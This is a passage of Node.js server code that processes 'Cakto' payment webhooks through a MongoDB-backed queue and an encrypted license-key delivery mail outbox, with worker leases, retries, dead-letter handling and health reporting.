  return txKey ? `cm_${crypto.createHash('sha256').update(`mail\0${txKey}`, 'utf8').digest('hex').slice(0, 32)}` : '';
}

function caktoMailSecretRing() {
  const raw = [CAKTO_RECOVERY_SECRET || APP_SECRET, ...String(CAKTO_RECOVERY_SECRET_PREVIOUS || '').split(',').map(v => v.trim())].filter(Boolean);
  const out = [], seen = new Set();
  for (const secret of raw) {
    if (Buffer.byteLength(secret, 'utf8') < 32) continue;
    const kid = crypto.createHash('sha256').update(`zvm:cakto:recovery:kid\0${secret}`, 'utf8').digest('hex').slice(0, 16);
    if (seen.has(kid)) continue;
    seen.add(kid);
    out.push({ kid, key: crypto.createHash('sha256').update(`zvm:cakto:mail:v1\0${secret}`, 'utf8').digest() });
  }
  return out;
}

function caktoDurableMailEnabled() { return !!caktoMailSecretRing()[0]?.key; }

function encryptCaktoMailPayload(payload, aad) {
  const current = caktoMailSecretRing()[0];
  if (!current?.key) throw Object.assign(new Error('cakto_mail_crypto_unavailable'), { code: 'cakto_mail_crypto_unavailable' });
  const raw = Buffer.from(JSON.stringify(payload || {}), 'utf8');
  if (raw.length > 32 * 1024) throw Object.assign(new Error('cakto_mail_payload_too_large'), { code: 'cakto_mail_payload_too_large' });
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', current.key, iv);
  cipher.setAAD(Buffer.from(String(aad || ''), 'utf8'));
  const data = Buffer.concat([cipher.update(raw), cipher.final()]);
  return { v: 1, alg: 'A256GCM', kid: current.kid, iv: iv.toString('base64'), tag: cipher.getAuthTag().toString('base64'), data: data.toString('base64') };
}

function decryptCaktoMailPayload(payload, aad) {
  if (!payload || payload.v !== 1 || payload.alg !== 'A256GCM' || !/^[a-f0-9]{16}$/.test(String(payload.kid || ''))) throw Object.assign(new Error('cakto_mail_payload_invalid'), { code: 'cakto_mail_payload_invalid' });
  if (typeof payload.iv !== 'string' || typeof payload.tag !== 'string' || typeof payload.data !== 'string' || payload.iv.length > 64 || payload.tag.length > 64 || payload.data.length > 50000) throw Object.assign(new Error('cakto_mail_payload_invalid'), { code: 'cakto_mail_payload_invalid' });
  const iv = Buffer.from(payload.iv, 'base64'), tag = Buffer.from(payload.tag, 'base64'), ciphertext = Buffer.from(payload.data, 'base64');
  if (iv.length !== 12 || tag.length !== 16 || ciphertext.length > 32 * 1024) throw Object.assign(new Error('cakto_mail_payload_invalid'), { code: 'cakto_mail_payload_invalid' });
  const matched = caktoMailSecretRing().find(item => item.kid === payload.kid);
  if (!matched) throw Object.assign(new Error('cakto_mail_key_unavailable'), { code: 'cakto_mail_key_unavailable' });
  try {
    const decipher = crypto.createDecipheriv('aes-256-gcm', matched.key, iv);
    decipher.setAAD(Buffer.from(String(aad || ''), 'utf8'));
    decipher.setAuthTag(tag);
    const decoded = JSON.parse(Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8'));
    if (!decoded || typeof decoded !== 'object' || Array.isArray(decoded)) throw new Error('shape');
    return decoded;
  } catch (_) {
    throw Object.assign(new Error('cakto_mail_payload_invalid'), { code: 'cakto_mail_payload_invalid' });
  }
}

function caktoMailRetentionDate(kind = 'sent', nowValue = new Date()) {
  const now = nowValue instanceof Date ? new Date(nowValue) : new Date(nowValue);
  const days = kind === 'dead_letter' ? CAKTO_MAIL_DEAD_LETTER_RETENTION_DAYS : CAKTO_MAIL_RETENTION_DAYS;
  return new Date(now.getTime() + days * 86400000);
}

async function ensureCaktoDeliveryOutbox(db, purchase, plan, delivery, opts = {}) {
  if (!db || !purchase?.txId || !plan?.id || !delivery?.keyCode) throw Object.assign(new Error('cakto_mail_outbox_invalid'), { code: 'cakto_mail_outbox_invalid' });
  const mailRef = caktoMailRef(purchase.txId);
  if (!mailRef) throw Object.assign(new Error('cakto_mail_outbox_invalid'), { code: 'cakto_mail_outbox_invalid' });
  const keyStore = opts.keyStore || keys;
  const key = keyStore[delivery.keyCode] || {};
  const to = safeScalar(purchase.clientEmail, 160).toLowerCase();
  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(to)) throw Object.assign(new Error('cakto_mail_recipient_invalid'), { code: 'cakto_mail_recipient_invalid' });
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const payload = {
    to, code: delivery.keyCode, planId: key.planId || plan.id, planLabel: plan.shortName, maxUses: Number(key.maxUses) || Number(plan.maxUses) || 0,
    expiresAt: key.expiresAt || delivery.expiresAt || null, renewed: !!delivery.renewed,
    durationDays: Number(plan.durationDays) || 0, baseUrl: BASE_URL, extensionUrl: EXTENSION_URL,
    ctaPath: safeLocalRedirect(purchase.ctaPath, '/cliente'),
  };
  const payloadEnc = encryptCaktoMailPayload(payload, mailRef);
  const coll = db.collection('cakto_mail_outbox');
  try {
    await coll.insertOne({ _id: mailRef, mailRef, source: 'cakto', kind: 'key_delivery', status: 'pending', payloadEnc, attempts: 0, createdAt: now, updatedAt: now, nextAttemptAt: now });
    return { ok: true, created: true, mailRef };
  } catch (e) {
    if (e?.code !== 11000) throw e;
    const existing = await coll.findOne({ _id: mailRef }, { projection: { _id: 1, status: 1 } });
    if (!existing) throw e;
    return { ok: true, created: false, duplicate: true, mailRef, status: existing.status };
  }
}

async function claimNextCaktoMailOutbox(db, owner = _caktoWorkerId, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseUntil = new Date(now.getTime() + CAKTO_WORKER_LEASE_MS);
  const result = await db.collection('cakto_mail_outbox').findOneAndUpdate(
    { source: 'cakto', payloadEnc: { $type: 'object' }, $or: [
      { status: { $in: ['pending','retry'] }, nextAttemptAt: { $lte: now } },
      { status: 'processing', leaseUntil: { $lte: now } },
    ] },
    { $set: { status: 'processing', leaseOwner: owner, leaseUntil, ...(Number.isInteger(Number(opts.workerFence)) ? { workerFence: Number(opts.workerFence) } : {}), updatedAt: now, lastAttemptAt: now }, $inc: { attempts: 1 }, $unset: { failureCategory: '', failureRef: '', lastError: '' } },
    { sort: { nextAttemptAt: 1, createdAt: 1 }, returnDocument: 'after' }
  );
  return result && typeof result === 'object' && 'value' in result ? result.value : result;
}

function caktoMailLeaseFilter(doc) {
  const filter = { _id: doc?._id, leaseOwner: doc?.leaseOwner };
  if (Number.isInteger(Number(doc?.workerFence))) filter.workerFence = Number(doc.workerFence);
  return filter;
}

async function markCaktoMailFailure(db, doc, error, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const attempts = Math.max(1, Number(doc?.attempts || 1));
  const terminal = attempts >= CAKTO_MAIL_MAX_ATTEMPTS;
  const failureCategory = classifyCaktoQueueFailure(error);
  const failureRef = caktoQueueFailureRef(error);
  const update = terminal ? {
    $set: { status: 'dead_letter', failureCategory, failureRef, failedAt: now, updatedAt: now, expiresAt: caktoMailRetentionDate('dead_letter', now) },
    $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', nextAttemptAt: '', lastError: '' },
  } : {
    $set: { status: 'retry', failureCategory, failureRef, nextAttemptAt: new Date(now.getTime() + caktoRetryDelayMs(attempts)), updatedAt: now },
    $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', lastError: '' },
  };
  const result = await db.collection('cakto_mail_outbox').updateOne(caktoMailLeaseFilter(doc), update);
  return { terminal, matched: !!result?.matchedCount, failureCategory };
}

async function processCaktoMailOutboxItem(db, doc, deps = {}) {
  if (!doc?._id || !doc?.payloadEnc) throw Object.assign(new Error('cakto_mail_document_invalid'), { code: 'cakto_mail_document_invalid' });
  if (typeof deps.assertWorkerLease === 'function') await deps.assertWorkerLease();
  const payload = decryptCaktoMailPayload(doc.payloadEnc, doc.mailRef || doc._id);
  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(String(payload.to || '')) || !safeScalar(payload.code, 128)) throw Object.assign(new Error('cakto_mail_payload_invalid'), { code: 'cakto_mail_payload_invalid' });
  const mailer = deps.sendKeyDeliveryEmail || sendKeyDeliveryEmail;
  const delivered = await mailer(payload.to, {
    code: payload.code, planId: payload.planId || '', planLabel: payload.planLabel, maxUses: payload.maxUses, expiresAt: payload.expiresAt,
    renewed: !!payload.renewed, durationDays: payload.durationDays, baseUrl: payload.baseUrl || BASE_URL,
    extensionUrl: payload.extensionUrl || EXTENSION_URL, ctaPath: safeLocalRedirect(payload.ctaPath, '/cliente'),
  });
  if (!delivered) throw Object.assign(new Error('cakto_mail_provider_rejected'), { code: 'cakto_mail_provider_rejected' });
  if (typeof deps.assertWorkerLease === 'function') await deps.assertWorkerLease();
  const now = deps.now instanceof Date ? new Date(deps.now) : new Date();
  const result = await db.collection('cakto_mail_outbox').updateOne(
    caktoMailLeaseFilter(doc),
    { $set: { status: 'sent', sentAt: now, updatedAt: now, expiresAt: caktoMailRetentionDate('sent', now) }, $unset: { payloadEnc: '', leaseOwner: '', leaseUntil: '', workerFence: '', nextAttemptAt: '', failureCategory: '', failureRef: '', lastError: '' } }
  );
  if (!result?.matchedCount) throw Object.assign(new Error('cakto_mail_lease_lost'), { code: 'cakto_mail_lease_lost' });
  return { sent: true, mailRef: doc.mailRef || doc._id };
}

async function attemptCaktoMailByRef(db, mailRef, deps = {}) {
  const coll = db.collection('cakto_mail_outbox');
  const doc = await coll.findOne({ _id: mailRef });
  if (!doc) return { sent: false, missing: true };
  if (doc.status === 'sent') return { sent: true, duplicate: true };
  if (!['pending','retry'].includes(doc.status)) return { sent: false, deferred: true, status: doc.status };
  const now = deps.now instanceof Date ? new Date(deps.now) : new Date();
  const claimedResult = await coll.findOneAndUpdate(
    { _id: mailRef, status: doc.status },
    { $set: { status: 'processing', leaseOwner: deps.owner || `inline-${process.pid}`, leaseUntil: new Date(now.getTime() + CAKTO_WORKER_LEASE_MS), updatedAt: now, lastAttemptAt: now }, $inc: { attempts: 1 } },
    { returnDocument: 'after' }
  );
  const claimed = claimedResult && typeof claimedResult === 'object' && 'value' in claimedResult ? claimedResult.value : claimedResult;
  if (!claimed) return { sent: false, deferred: true };
  try { return await processCaktoMailOutboxItem(db, claimed, deps); }
  catch (e) { await markCaktoMailFailure(db, claimed, e, { now }); return { sent: false, deferred: true, errorRef: caktoQueueFailureRef(e) }; }
}

async function getCaktoMailHealth(db) {
  if (!db || typeof db.collection !== 'function') throw new Error('cakto_mail_db_unavailable');
  const coll = db.collection('cakto_mail_outbox');
  const counts = {};
  for (const status of ['pending','retry','processing','sent','dead_letter']) counts[status] = Number(await coll.countDocuments({ source: 'cakto', status })) || 0;
  const oldest = {};
  for (const status of ['pending','retry','processing','dead_letter']) {
    const doc = await coll.findOne({ source: 'cakto', status }, { projection: { _id: 0, createdAt: 1, updatedAt: 1 }, sort: { createdAt: 1 } });
    const stamp = doc?.createdAt || doc?.updatedAt || null;
    oldest[status] = stamp ? new Date(stamp).toISOString() : null;
  }
  const active = counts.pending + counts.retry + counts.processing;
  return Object.freeze({ counts, oldest, active, maxAttempts: CAKTO_MAIL_MAX_ATTEMPTS, retentionDays: { sent: CAKTO_MAIL_RETENTION_DAYS, deadLetter: CAKTO_MAIL_DEAD_LETTER_RETENTION_DAYS } });
}

async function requeueCaktoMail(db, ref, opts = {}) {
  const mailRef = safeScalar(ref, 64);
  if (!/^cm_[a-f0-9]{32}$/.test(mailRef)) return { ok: false, error: 'invalid_mail_ref' };
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const result = await db.collection('cakto_mail_outbox').findOneAndUpdate(
    { _id: mailRef, source: 'cakto', status: 'dead_letter', payloadEnc: { $type: 'object' } },
    { $set: { status: 'pending', attempts: 0, nextAttemptAt: now, updatedAt: now }, $inc: { manualRequeues: 1 }, $unset: { failedAt: '', failureCategory: '', failureRef: '', leaseOwner: '', leaseUntil: '', workerFence: '', expiresAt: '', lastError: '' } },
    { returnDocument: 'after' }
  );
  const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
  if (!doc) return { ok: false, error: 'mail_not_requeueable' };
  return { ok: true, mailRef: doc.mailRef || doc._id };
}

async function enqueueCaktoPurchaseEvent(db, purchase, plan, opts = {}) {
  if (!db || !purchase?.txId || !plan?.id) throw new Error('cakto_queue_invalid');
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const eventKey = caktoEventKey(purchase.txId);
  if (!eventKey) throw new Error('cakto_queue_invalid');
  const queueRef = caktoQueueRef(eventKey);
  const coll = db.collection('webhook_events');
  // Preflight evita reservar slot de fila para um evento já persistido,
  // inclusive quando a fila está cheia (backpressure só se aplica a novos).
  const alreadyQueued = await coll.findOne({ eventKey, source: 'cakto' }, { projection: { _id: 1 } });
  if (alreadyQueued) {
    const duplicate = await recoverCaktoDuplicateEvent(db, eventKey, queueRef, now);
    if (duplicate) return duplicate; // TTL concorrente removeu a linha: tentar inserção normal.
  }
  const maxActive = Math.max(0, opts.maxActive === undefined ? CAKTO_QUEUE_MAX_ACTIVE : (Number(opts.maxActive) || 0));
  let reservedFallback = false;
  try {
    return await runCaktoQueueAtomic(db, async (session, transactional) => {
      const slot = await reserveCaktoQueueSlot(db, maxActive, { session });
      if (!slot.ok) throw Object.assign(new Error(slot.error || 'cakto_queue_backpressure'), { code: slot.error || 'cakto_queue_backpressure' });
      if (!transactional) reservedFallback = !!slot.reserved;
      const sessionOpt = session ? { session } : {};
      const purchaseEnc = encryptCaktoQueuePurchase(purchase, queueRef);
      await coll.insertOne({
        eventKey, queueRef, source: 'cakto', event: purchase.event,
        planId: plan.id, status: 'pending', activeSlot: true, purchaseEnc,
        attempts: 0, createdAt: now, updatedAt: now, nextAttemptAt: now,
      }, sessionOpt);
      reservedFallback = false;
      return { queued: true, duplicate: false, queueRef };
    }, opts.atomic || {});
  } catch (e) {
    if (reservedFallback) await releaseCaktoQueueSlot(db).catch(() => {});
    if (e?.code !== 11000 && e?.code !== 'cakto_queue_backpressure') throw e;
    // Duas inserções simultâneas podem competir pelo índice único ou slot.
    // Só responder como duplicado se a linha já existir realmente.
    const duplicate = await recoverCaktoDuplicateEvent(db, eventKey, queueRef, now);
    if (duplicate) return duplicate;
    throw e;
  }
}

async function acquireCaktoWorkerLeaseToken(db, owner = _caktoWorkerId, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseUntil = new Date(now.getTime() + CAKTO_WORKER_LEASE_MS);
  const expiresAt = new Date(leaseUntil.getTime() + WORKER_LOCK_RETENTION_MS);
  try {
    const result = await db.collection('worker_locks').findOneAndUpdate(
      { _id: 'cakto', $or: [{ owner }, { leaseUntil: { $lte: now } }, { leaseUntil: { $exists: false } }] },
      { $set: { owner, leaseUntil, expiresAt, updatedAt: now, kind: 'cakto_worker' }, $setOnInsert: { createdAt: now }, $inc: { fence: 1 } },
      { upsert: true, returnDocument: 'after' }
    );
    const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
    if (doc && doc.owner === owner && Number.isInteger(Number(doc.fence)) && new Date(doc.leaseUntil).getTime() > now.getTime()) {
      return { ok: true, owner, fence: Number(doc.fence), leaseUntil: new Date(doc.leaseUntil) };
    }
    return { ok: false, owner, error: 'cakto_worker_busy' };
  } catch (e) {
    if (e?.code === 11000) return { ok: false, owner, error: 'cakto_worker_busy' };
    throw e;
  }
}

async function acquireCaktoWorkerLease(db, owner = _caktoWorkerId, opts = {}) {
  return !!(await acquireCaktoWorkerLeaseToken(db, owner, opts)).ok;
}

async function renewCaktoWorkerLease(db, owner = _caktoWorkerId, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseUntil = new Date(now.getTime() + CAKTO_WORKER_LEASE_MS);
  const expiresAt = new Date(leaseUntil.getTime() + WORKER_LOCK_RETENTION_MS);
  const filter = { _id: 'cakto', owner };
  if (Number.isInteger(Number(opts.fence))) filter.fence = Number(opts.fence);
  const result = await db.collection('worker_locks').updateOne(filter, { $set: { leaseUntil, expiresAt, updatedAt: now } });
  return !!result.matchedCount;
}

async function releaseCaktoWorkerLease(db, owner = _caktoWorkerId, opts = {}) {
  const now = new Date();
  const filter = { _id: 'cakto', owner };
  if (Number.isInteger(Number(opts.fence))) filter.fence = Number(opts.fence);
  await db.collection('worker_locks').updateOne(
    filter,
    { $set: { leaseUntil: new Date(0), expiresAt: new Date(now.getTime() + WORKER_LOCK_RETENTION_MS), updatedAt: now } }
  ).catch(() => {});
}

async function claimNextCaktoQueuedEvent(db, owner = _caktoWorkerId, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseUntil = new Date(now.getTime() + CAKTO_WORKER_LEASE_MS);
  const result = await db.collection('webhook_events').findOneAndUpdate(
    {
      source: 'cakto',
      $and: [
        { $or: [{ purchaseEnc: { $type: 'object' } }, { purchase: { $type: 'object' } }] },
        caktoRunnableQueueFilter(now),
      ],
    },
    {
      $set: { status: 'processing', leaseOwner: owner, leaseUntil, ...(Number.isInteger(Number(opts.workerFence)) ? { workerFence: Number(opts.workerFence) } : {}), lastAttemptAt: now, updatedAt: now },
      $inc: { attempts: 1 }, $unset: { lastError: '' },
    },
    { sort: { nextAttemptAt: 1, createdAt: 1 }, returnDocument: 'after' }
  );
  let doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
  if (!doc) return doc;
  if (!doc.purchaseEnc && doc.purchase) {
    const migrated = await migrateCaktoQueuedPurchaseDocument(db, doc);
    if (migrated.migrated) doc = migrated.doc;
  }
  const purchase = decryptCaktoQueuePurchase(doc);
  return { ...doc, purchase };
}

function caktoEventLeaseFilter(doc) {
  const filter = { eventKey: doc?.eventKey, leaseOwner: doc?.leaseOwner };
  if (Number.isInteger(Number(doc?.workerFence))) filter.workerFence = Number(doc.workerFence);
  return filter;
}

function caktoRetryDelayMs(attempt) {
  const steps = [5000, 30000, 2 * 60000, 10 * 60000, 30 * 60000, 2 * 60 * 60000, 6 * 60 * 60000, 24 * 60 * 60000];
  return steps[Math.max(0, Math.min(steps.length - 1, Number(attempt || 1) - 1))];
}

function caktoRetentionDate(kind = 'processed', nowValue = new Date()) {
  const now = nowValue instanceof Date ? new Date(nowValue) : new Date(nowValue);
  const days = kind === 'dead_letter' ? CAKTO_DEAD_LETTER_RETENTION_DAYS : CAKTO_EVENT_RETENTION_DAYS;
  return new Date(now.getTime() + days * 24 * 60 * 60 * 1000);
}

async function getCaktoQueueHealth(db, opts = {}) {
  if (!db || typeof db.collection !== 'function') throw new Error('cakto_queue_db_unavailable');
  const coll = db.collection('webhook_events');
  const statuses = ['pending','retry','processing','dead_letter','processed','payment_duplicate'];
  const counts = {};
  for (const status of statuses) counts[status] = Number(await coll.countDocuments({ source: 'cakto', status })) || 0;
  const oldest = {};
  for (const status of ['pending','retry','processing','dead_letter']) {
    const doc = await coll.findOne({ source: 'cakto', status }, { projection: { _id: 0, createdAt: 1, updatedAt: 1 }, sort: { createdAt: 1 } });
    const stamp = doc?.createdAt || doc?.updatedAt || null;
    oldest[status] = stamp ? new Date(stamp).toISOString() : null;
  }
  return Object.freeze({
    counts,
    oldest,
    retentionDays: { processed: CAKTO_EVENT_RETENTION_DAYS, deadLetter: CAKTO_DEAD_LETTER_RETENTION_DAYS },
    maxAttempts: CAKTO_WORKER_MAX_ATTEMPTS,
    maxActive: CAKTO_QUEUE_MAX_ACTIVE,
    indexReady: opts.indexReady === undefined ? !!_caktoIndexReady : !!opts.indexReady,
  });
}

async function markCaktoQueueFailure(db, doc, error, opts = {}) {
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const attempts = Math.max(1, Number(doc?.attempts || 1));
  const terminal = attempts >= CAKTO_WORKER_MAX_ATTEMPTS;
  const failureCategory = classifyCaktoQueueFailure(error);
  const failureRef = caktoQueueFailureRef(error);
  let recoveryPayload = null;
  if (terminal) {
    try {
      const purchase = doc?.purchase || decryptCaktoQueuePurchase(doc);
      recoveryPayload = encryptCaktoRecoveryPayload(purchase, doc.queueRef || caktoQueueRef(doc.eventKey));
    } catch (_) {}
  }
  const update = terminal ? {
    $set: { status: 'dead_letter', activeSlot: false, failureCategory, failureRef, failedAt: now, updatedAt: now, expiresAt: caktoRetentionDate('dead_letter', now), ...(recoveryPayload ? { recoveryPayload } : {}) },
    $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', nextAttemptAt: '', purchase: '', purchaseEnc: '', txId: '', refId: '', lastError: '' },
  } : {
    $set: { status: 'retry', failureCategory, failureRef, nextAttemptAt: new Date(now.getTime() + caktoRetryDelayMs(attempts)), updatedAt: now },
    $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', lastError: '' },
  };
  let result;
  if (terminal && doc.activeSlot !== false) {
    result = await runCaktoQueueAtomic(db, async (session) => {
      const sessionOpt = session ? { session } : {};
      const changed = await db.collection('webhook_events').updateOne(caktoEventLeaseFilter(doc), update, sessionOpt);
      if (changed?.matchedCount) {
        const released = await releaseCaktoQueueSlot(db, { session });
        if (!released) throw Object.assign(new Error('cakto_queue_counter_inconsistent'), { code: 'cakto_queue_counter_inconsistent' });
      }
      return changed;
    }, opts.atomic || {});
  } else {
    result = await db.collection('webhook_events').updateOne(caktoEventLeaseFilter(doc), update);
  }
  return { terminal, attempts, failureCategory, matched: !!result?.matchedCount };
}

async function processCaktoQueuedEvent(db, doc, deps = {}) {
  if (!doc?.eventKey || !doc?.planId) throw new Error('cakto_queue_document_invalid');
  if (typeof deps.assertWorkerLease === 'function') await deps.assertWorkerLease();
  const purchase = doc.purchase || decryptCaktoQueuePurchase(doc);
  const plan = ZVM_PAYMENT_PLANS[doc.planId] || null;
  const commercialCheck = validateCaktoCommercialIntegrity(purchase, plan);
  if (!commercialCheck.ok) throw new Error(`cakto_queue_${commercialCheck.error}`);

  const existingPayment = await findCommercialPaymentByTx(db, purchase);
  if (existingPayment) {
    let outbox = null;
    if (caktoDurableMailEnabled()) {
      outbox = await ensureCaktoDeliveryOutbox(db, purchase, plan, { keyCode: existingPayment.keyCode, renewed: !!existingPayment.renewed }, deps.commercialDeps || {});
    }
    if (typeof deps.assertWorkerLease === 'function') await deps.assertWorkerLease();
    await runCaktoQueueAtomic(db, async (session) => {
      const sessionOpt = session ? { session } : {};
      const changed = await db.collection('webhook_events').updateOne(
        caktoEventLeaseFilter(doc),
        { $set: { status: 'payment_duplicate', activeSlot: false, processedAt: new Date(), updatedAt: new Date(), expiresAt: caktoRetentionDate('processed') }, $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', purchase: '', purchaseEnc: '', recoveryPayload: '', txId: '', refId: '' } },
        sessionOpt
      );
      if (changed?.matchedCount && doc.activeSlot !== false) {
        const released = await releaseCaktoQueueSlot(db, { session });
        if (!released) throw Object.assign(new Error('cakto_queue_counter_inconsistent'), { code: 'cakto_queue_counter_inconsistent' });
      }
      return changed;
    }, deps.atomic || {});
    return { duplicate: true, mailRef: outbox?.mailRef || null };
  }

  const result = await processCommercialSale(purchase, plan, { ...(deps.commercialDeps || {}), db, deferMail: true });
  if (typeof deps.assertWorkerLease === 'function') await deps.assertWorkerLease();
  await runCaktoQueueAtomic(db, async (session) => {
    const sessionOpt = session ? { session } : {};
    const updateResult = await db.collection('webhook_events').updateOne(
      caktoEventLeaseFilter(doc),
      {
        $set: {
          status: 'processed', activeSlot: false, processedAt: new Date(), updatedAt: new Date(), expiresAt: caktoRetentionDate('processed'),
          result: { renewed: !!result.renewed, licenseRef: maskLicenseCode(result.keyCode), emailDelivered: !!result.emailDelivered, mailRef: result.mailRef || null },
        },
        $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', purchase: '', purchaseEnc: '', recoveryPayload: '', lastError: '', failureCategory: '', failureRef: '', nextAttemptAt: '', txId: '', refId: '' },
      },
      sessionOpt
    );
    if (updateResult?.matchedCount && doc.activeSlot !== false) {
      const released = await releaseCaktoQueueSlot(db, { session });
      if (!released) throw Object.assign(new Error('cakto_queue_counter_inconsistent'), { code: 'cakto_queue_counter_inconsistent' });
    }
    return updateResult;
  }, deps.atomic || {});
  console.log(result.renewed ? '[CAKTO][RENEW]' : '[CAKTO][PURCHASE]', {
    txRef: maskTransactionId(purchase.txId), planId: plan.id, licenseRef: maskLicenseCode(result.keyCode), email: maskEmail(purchase.clientEmail),
  });
  return result;
}

async function runCaktoWorkerOnce(deps = {}) {
  const db = deps.db || await getMongoDb();
  const owner = deps.owner || _caktoWorkerId;
  const lease = await acquireCaktoWorkerLeaseToken(db, owner, { now: deps.now });
  if (!lease.ok) return { acquired: false, processed: 0, failed: 0, deadLettered: 0 };
  let processed = 0, failed = 0, deadLettered = 0, leaseLost = false;
  const assertWorkerLease = async () => {
    if (leaseLost) throw Object.assign(new Error('cakto_worker_lease_lost'), { code: 'cakto_worker_lease_lost' });
    const ok = await renewCaktoWorkerLease(db, owner, { fence: lease.fence });
    if (!ok) {
      leaseLost = true;
      throw Object.assign(new Error('cakto_worker_lease_lost'), { code: 'cakto_worker_lease_lost' });
    }
    return true;
  };
  const heartbeatMs = Math.max(10000, Math.min(30000, Math.floor(CAKTO_WORKER_LEASE_MS / 3)));
  const heartbeat = setInterval(() => {
    renewCaktoWorkerLease(db, owner, { fence: lease.fence }).then(ok => { if (!ok) leaseLost = true; }).catch(() => { leaseLost = true; });
  }, heartbeatMs);
  heartbeat.unref();
  try {
    for (let i = 0; i < (deps.batch || CAKTO_WORKER_BATCH); i++) {
      await assertWorkerLease();
      const doc = await claimNextCaktoQueuedEvent(db, owner, { now: deps.now, workerFence: lease.fence });
      if (!doc) break;
      try {
        await processCaktoQueuedEvent(db, doc, { ...deps, assertWorkerLease });
        processed++;
      } catch (e) {
        const failure = await markCaktoQueueFailure(db, doc, e, { now: deps.now });
        failed++;
        if (failure.terminal) deadLettered++;
        console.error('[CAKTO][WORKER]', { queueRef: doc.queueRef || caktoQueueRef(doc.eventKey), attempt: doc.attempts || 0, terminal: failure.terminal, category: failure.failureCategory, errorRef: caktoQueueFailureRef(e) });
        if (e?.code === 'cakto_worker_lease_lost') break;
      }
    }
    if (!leaseLost) {
      for (let i = 0; i < (deps.mailBatch || CAKTO_MAIL_BATCH); i++) {
        await assertWorkerLease();
        const mailDoc = await claimNextCaktoMailOutbox(db, owner, { now: deps.now, workerFence: lease.fence });
        if (!mailDoc) break;
        try {
          await processCaktoMailOutboxItem(db, mailDoc, { ...deps, assertWorkerLease });
        } catch (e) {
          await markCaktoMailFailure(db, mailDoc, e, { now: deps.now });
          console.error('[CAKTO][MAIL]', { mailRef: mailDoc.mailRef || mailDoc._id, category: classifyCaktoQueueFailure(e), errorRef: caktoQueueFailureRef(e) });
        }
      }
    }
  } finally {
    clearInterval(heartbeat);
    await releaseCaktoWorkerLease(db, owner, { fence: lease.fence });
  }
  return { acquired: true, processed, failed, deadLettered, leaseLost };
}

async function requeueCaktoEvent(db, refOrKey, opts = {}) {
  const ref = safeScalar(refOrKey, 220);
  const isQueueRef = /^cq_[a-f0-9]{24}$/.test(ref);
  const isEventKey = /^cakto:purchase_approved:[A-Za-z0-9._:-]{1,180}$/.test(ref);
  if (!isQueueRef && !isEventKey) return { ok: false, error: 'invalid_queue_ref' };
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const filter = isQueueRef ? { queueRef: ref } : { eventKey: ref };
  const coll = db.collection('webhook_events');
  const existing = await coll.findOne({ ...filter, source: 'cakto', status: { $in: ['dead_letter','failed','retry'] } });
  if (!existing) return { ok: false, error: 'event_not_requeueable' };
  let purchase = existing.purchase;
  let slot = { ok: true, reserved: false };
  if (existing.status === 'dead_letter') {
    if (!purchase) {
      try { purchase = decryptCaktoRecoveryPayload(existing.recoveryPayload, existing.queueRef || caktoQueueRef(existing.eventKey)); }
      catch (e) { return { ok: false, error: e.code || 'cakto_requeue_payload_unavailable' }; }
    }
    let atomicResult = null;
    try {
      atomicResult = await runCaktoQueueAtomic(db, async (session, transactional) => {
        slot = await reserveCaktoQueueSlot(db, opts.maxActive === undefined ? CAKTO_QUEUE_MAX_ACTIVE : opts.maxActive, { session });
        if (!slot.ok) return { ok: false, error: slot.error || 'cakto_queue_backpressure' };
        const sessionOpt = session ? { session } : {};
        const result = await coll.findOneAndUpdate(
          { ...filter, source: 'cakto', status: existing.status },
          { $set: { status: 'pending', activeSlot: true, purchaseEnc: encryptCaktoQueuePurchase(purchase, existing.queueRef || caktoQueueRef(existing.eventKey)), attempts: 0, nextAttemptAt: now, updatedAt: now }, $inc: { manualRequeues: 1 }, $unset: { purchase:'', txId:'', refId:'', failedAt:'', lastError:'', failureCategory:'', failureRef:'', recoveryPayload:'', leaseOwner:'', leaseUntil:'', workerFence:'', expiresAt:'' } },
          { returnDocument: 'after', ...sessionOpt }
        );
        const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
        if (!doc) {
          if (!transactional && slot.reserved) await releaseCaktoQueueSlot(db, { session }).catch(() => {});
          return { ok: false, error: 'event_not_requeueable' };
        }
        return { ok: true, queueRef: doc.queueRef || caktoQueueRef(doc.eventKey) };
      }, opts.atomic || {});
    } catch (e) {
      if (slot.reserved) await releaseCaktoQueueSlot(db).catch(() => {});
      throw e;
    }
    return atomicResult;
  }
  const queueRef = existing.queueRef || caktoQueueRef(existing.eventKey);
  const purchaseEnc = existing.purchaseEnc || (purchase ? encryptCaktoQueuePurchase(purchase, queueRef) : null);
  if (!purchaseEnc) return { ok: false, error: 'cakto_requeue_payload_unavailable' };
  const result = await coll.findOneAndUpdate(
    { ...filter, source: 'cakto', status: existing.status },
    { $set: { status: 'pending', activeSlot: true, purchaseEnc, attempts: 0, nextAttemptAt: now, updatedAt: now }, $inc: { manualRequeues: 1 }, $unset: { purchase:'', txId:'', refId:'', failedAt:'', lastError:'', failureCategory:'', failureRef:'', recoveryPayload:'', leaseOwner:'', leaseUntil:'', workerFence:'', expiresAt:'' } },
    { returnDocument: 'after' }
  );
  const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
